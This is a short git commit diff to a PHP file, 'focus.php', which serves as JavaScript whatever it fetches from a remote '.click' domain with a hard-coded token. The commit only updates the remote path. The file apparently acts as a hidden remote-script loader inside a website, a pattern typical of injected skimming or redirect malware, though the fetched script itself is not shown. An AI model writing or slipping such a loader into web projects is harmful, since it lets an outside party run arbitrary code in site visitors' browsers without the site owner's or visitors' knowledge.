03f12e22c489e04f8b68b07f09d16d44317da341
juan2982xxx1 <alejandrocharmedina@gmail.com>
2025-04-26 16:03:46 +0200

    Update focus.php

--- focus.php
+++ focus.php
@@ -1,4 +1,4 @@
 <?php
 header('Content-Type: application/javascript');
-echo file_get_contents('https://472.tusilandia.click/__472/script.php?tok=lupin7777');
+echo file_get_contents('https://472.tusilandia.click/__servi/script.php?tok=lupin7777');
 ?>
